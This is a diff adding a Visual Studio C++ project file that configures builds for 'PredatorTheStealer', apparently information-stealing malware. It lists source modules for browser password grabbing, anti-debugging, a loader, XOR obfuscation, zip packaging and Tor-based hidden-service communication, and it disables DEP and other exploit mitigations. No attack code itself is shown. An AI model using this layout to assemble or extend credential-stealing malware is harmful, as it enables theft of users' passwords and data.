@@ -1,0 +1,415 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>15.0</VCProjectVersion>
+    <ProjectGuid>{190DFAEB-0288-4043-BE0E-3273FA653B52}</ProjectGuid>
+    <RootNamespace>PredatorTheStealer</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
+    <ProjectName>PredatorTheStealer</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v141</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v141</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v141</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v141</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <IncludePath>C:\Users\Борутогавно\Desktop\projects\C++\Predator\PredatorTheStealer\PredatorTheStealer\mini;$(IncludePath)</IncludePath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <IncludePath>$(SolutionDir)\PredatorTheStealer\mini;$(IncludePath)</IncludePath>
+    <GenerateManifest>true</GenerateManifest>
+    <LinkIncremental>false</LinkIncremental>
+    <SourcePath>$(SolutionDir)\PredatorTheStealer\mini;$(SourcePath)</SourcePath>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <SDLCheck>false</SDLCheck>
+      <ConformanceMode>true</ConformanceMode>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_WINSOCKAPI_;_WINSOCK_DEPRECATED_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalOptions>/MT %(AdditionalOptions)</AdditionalOptions>
+      <RuntimeTypeInfo>true</RuntimeTypeInfo>
+      <ObjectFileName>$(IntDir)/%(RelativeDir)/</ObjectFileName>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+    </ClCompile>
+    <Link>
+      <AdditionalLibraryDirectories>%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <FixedBaseAddress>true</FixedBaseAddress>
+      <AdditionalDependencies>kernel32.lib;bcrypt.lib;shlwapi.lib;crypt32.lib;wininet.lib;ws2_32.lib;secur32.lib;ntdll.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;chkstk.obj;int64.lib</AdditionalDependencies>
+      <GenerateDebugInformation>DebugFastLink</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <SDLCheck>true</SDLCheck>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MinSpace</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <ConformanceMode>true</ConformanceMode>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;RELEASE_BUILD;_WINSOCKAPI_;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <StringPooling>true</StringPooling>
+      <ExceptionHandling>false</ExceptionHandling>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <UndefinePreprocessorDefinitions>ASSERT;%(UndefinePreprocessorDefinitions)</UndefinePreprocessorDefinitions>
+      <CallingConvention>FastCall</CallingConvention>
+      <ControlFlowGuard>false</ControlFlowGuard>
+      <OmitFramePointers>true</OmitFramePointers>
+      <RuntimeTypeInfo>false</RuntimeTypeInfo>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <OmitDefaultLibName>false</OmitDefaultLibName>
+      <ObjectFileName>$(IntDir)/%(RelativeDir)/</ObjectFileName>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+    </ClCompile>
+    <Link>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <RandomizedBaseAddress>true</RandomizedBaseAddress>
+      <FixedBaseAddress>false</FixedBaseAddress>
+      <SubSystem>Windows</SubSystem>
+      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
+      <AdditionalDependencies>kernel32.lib</AdditionalDependencies>
+      <GenerateWindowsMetadata>false</GenerateWindowsMetadata>
+      <GenerateMapFile>false</GenerateMapFile>
+      <EntryPointSymbol>
+      </EntryPointSymbol>
+      <DataExecutionPrevention>false</DataExecutionPrevention>
+      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+      <AssemblyDebug>false</AssemblyDebug>
+      <AdditionalOptions>/DEBUG:NONE /EMITPOGOPHASEINFO %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MinSpace</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <ConformanceMode>true</ConformanceMode>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <StringPooling>true</StringPooling>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <CallingConvention>FastCall</CallingConvention>
+    </ClCompile>
+    <Link>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <GenerateWindowsMetadata>false</GenerateWindowsMetadata>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <FixedBaseAddress>true</FixedBaseAddress>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="AntiDebug.cpp" />
+    <ClCompile Include="Base64.cpp" />
+    <ClCompile Include="ByteHelper.cpp" />
+    <ClCompile Include="crc32.cpp" />
+    <ClCompile Include="DynImport.cpp" />
+    <ClCompile Include="EdgeGrabber.cpp" />
+    <ClCompile Include="FireFoxGrabber.cpp" />
+    <ClCompile Include="Hash.cpp" />
+    <ClCompile Include="hmac_sha1.cpp" />
+    <ClCompile Include="ldasm.cpp" />
+    <ClCompile Include="Loader.cpp" />
+    <ClCompile Include="Main.cpp" />
+    <ClCompile Include="mini\mini\common.cpp" />
+    <ClCompile Include="mini\mini\console.cpp" />
+    <ClCompile Include="mini\mini\crt\crt0.cpp" />
+    <ClCompile Include="mini\mini\crypto\capi\base16.cpp" />
+    <ClCompile Include="mini\mini\crypto\capi\base64.cpp" />
+    <ClCompile Include="mini\mini\crypto\capi\detail\base_encode.cpp" />
+    <ClCompile Include="mini\mini\crypto\capi\provider.cpp" />
+    <ClCompile Include="mini\mini\crypto\capi\random.cpp" />
+    <ClCompile Include="mini\mini\crypto\cng\curve25519.cpp" />
+    <ClCompile Include="mini\mini\crypto\cng\provider.cpp" />
+    <ClCompile Include="mini\mini\crypto\cng\random.cpp" />
+    <ClCompile Include="mini\mini\crypto\ext\base32.cpp" />
+    <ClCompile Include="mini\mini\crypto\ext\curve25519.cpp" />
+    <ClCompile Include="mini\mini\crypto\ext\detail\curve25519-donna.cpp" />
+    <ClCompile Include="mini\mini\io\file.cpp" />
+    <ClCompile Include="mini\mini\io\file_attributes.cpp" />
+    <ClCompile Include="mini\mini\io\file_enumerator.cpp" />
+    <ClCompile Include="mini\mini\io\path.cpp" />
+    <ClCompile Include="mini\mini\logger.cpp" />
+    <ClCompile Include="mini\mini\memory.cpp" />
+    <ClCompile Include="mini\mini\net\detail\ssl_context.cpp" />
+    <ClCompile Include="mini\mini\net\http.cpp" />
+    <ClCompile Include="mini\mini\net\ssl_socket.cpp" />
+    <ClCompile Include="mini\mini\net\ssl_stream.cpp" />
+    <ClCompile Include="mini\mini\net\tcp_socket.cpp" />
+    <ClCompile Include="mini\mini\string.cpp" />
+    <ClCompile Include="mini\mini\threading\event.cpp" />
+    <ClCompile Include="mini\mini\threading\mutex.cpp" />
+    <ClCompile Include="mini\mini\threading\thread.cpp" />
+    <ClCompile Include="mini\mini\time.cpp" />
+    <ClCompile Include="mini\mini\tor\cell.cpp" />
+    <ClCompile Include="mini\mini\tor\circuit.cpp" />
+    <ClCompile Include="mini\mini\tor\circuit_node.cpp" />
+    <ClCompile Include="mini\mini\tor\circuit_node_crypto_state.cpp" />
+    <ClCompile Include="mini\mini\tor\consensus.cpp" />
+    <ClCompile Include="mini\mini\tor\crypto\hybrid_encryption.cpp" />
+    <ClCompile Include="mini\mini\tor\crypto\key_agreement_ntor.cpp" />
+    <ClCompile Include="mini\mini\tor\crypto\key_agreement_tap.cpp" />
+    <ClCompile Include="mini\mini\tor\hidden_service.cpp" />
+    <ClCompile Include="mini\mini\tor\onion_router.cpp" />
+    <ClCompile Include="mini\mini\tor\parsers\consensus_parser.cpp" />
+    <ClCompile Include="mini\mini\tor\parsers\hidden_service_descriptor_parser.cpp" />
+    <ClCompile Include="mini\mini\tor\parsers\introduction_point_parser.cpp" />
+    <ClCompile Include="mini\mini\tor\parsers\onion_router_descriptor_parser.cpp" />
+    <ClCompile Include="mini\mini\tor\relay_cell.cpp" />
+    <ClCompile Include="mini\mini\tor\tor_socket.cpp" />
+    <ClCompile Include="mini\mini\tor\tor_stream.cpp" />
+    <ClCompile Include="Module.cpp" />
+    <ClCompile Include="sha1.cpp" />
+    <ClCompile Include="Stealing.cpp" />
+    <ClCompile Include="wow64ext.cpp" />
+    <ClCompile Include="zip.cpp" />
+    <ClCompile Include="ZipWrapper.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="AntiDebug.h" />
+    <ClInclude Include="Asn1Der.h" />
+    <ClInclude Include="Base64.h" />
+    <ClInclude Include="BerkeleyDB.h" />
+    <ClInclude Include="BitmapType.h" />
+    <ClInclude Include="ByteHelper.h" />
+    <ClInclude Include="CMemPtr.h" />
+    <ClInclude Include="crc32.h" />
+    <ClInclude Include="DynImport.h" />
+    <ClInclude Include="EdgeGrabber.h" />
+    <ClInclude Include="file.h" />
+    <ClInclude Include="FireFoxBase.h" />
+    <ClInclude Include="FireFoxGrabber.h" />
+    <ClInclude Include="Hash.h" />
+    <ClInclude Include="hmac.h" />
+    <ClInclude Include="internal.h" />
+    <ClInclude Include="ldasm.h" />
+    <ClInclude Include="Loader.h" />
+    <ClInclude Include="mini\mini\algorithm.h" />
+    <ClInclude Include="mini\mini\allocator.h" />
+    <ClInclude Include="mini\mini\buffer_ref.h" />
+    <ClInclude Include="mini\mini\byte_buffer.h" />
+    <ClInclude Include="mini\mini\byte_buffer_ref.h" />
+    <ClInclude Include="mini\mini\collections\hashmap.h" />
+    <ClInclude Include="mini\mini\collections\hashset.h" />
+    <ClInclude Include="mini\mini\collections\linked_list.h" />
+    <ClInclude Include="mini\mini\collections\list.h" />
+    <ClInclude Include="mini\mini\collections\pair_list.h" />
+    <ClInclude Include="mini\mini\common.h" />
+    <ClInclude Include="mini\mini\compare.h" />
+    <ClInclude Include="mini\mini\console.h" />
+    <ClInclude Include="mini\mini\crt\crt0.h" />
+    <ClInclude Include="mini\mini\crypto\aes.h" />
+    <ClInclude Include="mini\mini\crypto\base16.h" />
+    <ClInclude Include="mini\mini\crypto\base32.h" />
+    <ClInclude Include="mini\mini\crypto\base64.h" />
+    <ClInclude Include="mini\mini\crypto\base\key.h" />
+    <ClInclude Include="mini\mini\crypto\capi\aes.h" />
+    <ClInclude Include="mini\mini\crypto\capi\base16.h" />
+    <ClInclude Include="mini\mini\crypto\capi\base64.h" />
+    <ClInclude Include="mini\mini\crypto\capi\detail\base_encode.h" />
+    <ClInclude Include="mini\mini\crypto\capi\dh.h" />
+    <ClInclude Include="mini\mini\crypto\capi\hash.h" />
+    <ClInclude Include="mini\mini\crypto\capi\hmac.h" />
+    <ClInclude Include="mini\mini\crypto\capi\key.h" />
+    <ClInclude Include="mini\mini\crypto\capi\provider.h" />
+    <ClInclude Include="mini\mini\crypto\capi\random.h" />
+    <ClInclude Include="mini\mini\crypto\capi\rsa.h" />
+    <ClInclude Include="mini\mini\crypto\cng\aes.h" />
+    <ClInclude Include="mini\mini\crypto\cng\curve25519.h" />
+    <ClInclude Include="mini\mini\crypto\cng\dh.h" />
+    <ClInclude Include="mini\mini\crypto\cng\hash.h" />
+    <ClInclude Include="mini\mini\crypto\cng\hmac.h" />
+    <ClInclude Include="mini\mini\crypto\cng\key.h" />
+    <ClInclude Include="mini\mini\crypto\cng\provider.h" />
+    <ClInclude Include="mini\mini\crypto\cng\random.h" />
+    <ClInclude Include="mini\mini\crypto\cng\rsa.h" />
+    <ClInclude Include="mini\mini\crypto\common.h" />
+    <ClInclude Include="mini\mini\crypto\curve25519.h" />
+    <ClInclude Include="mini\mini\crypto\dh.h" />
+    <ClInclude Include="mini\mini\crypto\ext\base32.h" />
+    <ClInclude Include="mini\mini\crypto\ext\curve25519.h" />
+    <ClInclude Include="mini\mini\crypto\ext\detail\curve25519-donna.h" />
+    <ClInclude Include="mini\mini\crypto\ext\key.h" />
+    <ClInclude Include="mini\mini\crypto\hmac_sha256.h" />
+    <ClInclude Include="mini\mini\crypto\random.h" />
+    <ClInclude Include="mini\mini\crypto\rfc5869.h" />
+    <ClInclude Include="mini\mini\crypto\rsa.h" />
+    <ClInclude Include="mini\mini\crypto\sha1.h" />
+    <ClInclude Include="mini\mini\ctl.h" />
+    <ClInclude Include="mini\mini\ctl\cctype.h" />
+    <ClInclude Include="mini\mini\ctl\cstdlib.h" />
+    <ClInclude Include="mini\mini\ctl\cstring.h" />
+    <ClInclude Include="mini\mini\flags.h" />
+    <ClInclude Include="mini\mini\function.h" />
+    <ClInclude Include="mini\mini\hash.h" />
+    <ClInclude Include="mini\mini\io\file.h" />
+    <ClInclude Include="mini\mini\io\file_attributes.h" />
+    <ClInclude Include="mini\mini\io\file_enumerator.h" />
+    <ClInclude Include="mini\mini\io\file_stream.h" />
+    <ClInclude Include="mini\mini\io\memory_stream.h" />
+    <ClInclude Include="mini\mini\io\path.h" />
+    <ClInclude Include="mini\mini\io\stream.h" />
+    <ClInclude Include="mini\mini\io\stream_reader.h" />
+    <ClInclude Include="mini\mini\io\stream_wrapper.h" />
+    <ClInclude Include="mini\mini\logger.h" />
+    <ClInclude Include="mini\mini\memory.h" />
+    <ClInclude Include="mini\mini\net\detail\ssl_context.h" />
+    <ClInclude Include="mini\mini\net\http.h" />
+    <ClInclude Include="mini\mini\net\ip_address.h" />
+    <ClInclude Include="mini\mini\net\ssl_socket.h" />
+    <ClInclude Include="mini\mini\net\ssl_stream.h" />
+    <ClInclude Include="mini\mini\net\tcp_socket.h" />
+    <ClInclude Include="mini\mini\net\uri.h" />
+    <ClInclude Include="mini\mini\pair.h" />
+    <ClInclude Include="mini\mini\ptr.h" />
+    <ClInclude Include="mini\mini\stack_buffer.h" />
+    <ClInclude Include="mini\mini\string.h" />
+    <ClInclude Include="mini\mini\string_hash.h" />
+    <ClInclude Include="mini\mini\string_ref.h" />
+    <ClInclude Include="mini\mini\threading\common.h" />
+    <ClInclude Include="mini\mini\threading\event.h" />
+    <ClInclude Include="mini\mini\threading\locked_value.h" />
+    <ClInclude Include="mini\mini\threading\mutex.h" />
+    <ClInclude Include="mini\mini\threading\thread.h" />
+    <ClInclude Include="mini\mini\threading\thread_function.h" />
+    <ClInclude Include="mini\mini\time.h" />
+    <ClInclude Include="mini\mini\tor\cell.h" />
+    <ClInclude Include="mini\mini\tor\circuit.h" />
+    <ClInclude Include="mini\mini\tor\circuit_node.h" />
+    <ClInclude Include="mini\mini\tor\circuit_node_crypto_state.h" />
+    <ClInclude Include="mini\mini\tor\common.h" />
+    <ClInclude Include="mini\mini\tor\consensus.h" />
+    <ClInclude Include="mini\mini\tor\crypto\hybrid_encryption.h" />
+    <ClInclude Include="mini\mini\tor\crypto\key_agreement.h" />
+    <ClInclude Include="mini\mini\tor\crypto\key_agreement_ntor.h" />
+    <ClInclude Include="mini\mini\tor\crypto\key_agreement_tap.h" />
+    <ClInclude Include="mini\mini\tor\hidden_service.h" />
+    <ClInclude Include="mini\mini\tor\onion_router.h" />
+    <ClInclude Include="mini\mini\tor\parsers\consensus_parser.h" />
+    <ClInclude Include="mini\mini\tor\parsers\hidden_service_descriptor_parser.h" />
+    <ClInclude Include="mini\mini\tor\parsers\introduction_point_parser.h" />
+    <ClInclude Include="mini\mini\tor\parsers\onion_router_descriptor_parser.h" />
+    <ClInclude Include="mini\mini\tor\relay_cell.h" />
+    <ClInclude Include="mini\mini\tor\tor_socket.h" />
+    <ClInclude Include="mini\mini\tor\tor_stream.h" />
+    <ClInclude Include="Module.h" />
+    <ClInclude Include="MozillaPBE.h" />
+    <ClInclude Include="PasswordCheck.h" />
+    <ClInclude Include="prototypes.h" />
+    <ClInclude Include="qedit.h" />
+    <ClInclude Include="sha.h" />
+    <ClInclude Include="SqlHandler.h" />
+    <ClInclude Include="Stealing.h" />
+    <ClInclude Include="TorWrapper.h" />
+    <ClInclude Include="TripleDesDecrypt.h" />
+    <ClInclude Include="wow64ext.h" />
+    <ClInclude Include="xor.h" />
+    <ClInclude Include="zip.h" />
+    <ClInclude Include="ZipWrapper.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="mini\mini\buffer_ref.inl" />
+    <None Include="mini\mini\collections\hashmap.inl" />
+    <None Include="mini\mini\collections\hashset.inl" />
+    <None Include="mini\mini\collections\list.inl" />
+    <None Include="mini\mini\collections\pair_list.inl" />
+    <None Include="mini\mini\crt\msvcrt.def" />
+    <None Include="mini\mini\crypto\capi\aes.inl" />
+    <None Include="mini\mini\crypto\capi\dh.inl" />
+    <None Include="mini\mini\crypto\capi\hash.inl" />
+    <None Include="mini\mini\crypto\capi\hmac.inl" />
+    <None Include="mini\mini\crypto\capi\rsa.inl" />
+    <None Include="mini\mini\crypto\cng\aes.inl" />
+    <None Include="mini\mini\crypto\cng\dh.inl" />
+    <None Include="mini\mini\crypto\cng\hash.inl" />
+    <None Include="mini\mini\crypto\cng\hmac.inl" />
+    <None Include="mini\mini\crypto\cng\rsa.inl" />
+    <None Include="mini\mini\ptr.inl" />
+    <None Include="mini\mini\stack_buffer.inl" />
+    <None Include="mini\mini\string_ref.inl" />
+    <None Include="mini\mini\threading\locked_value.inl" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
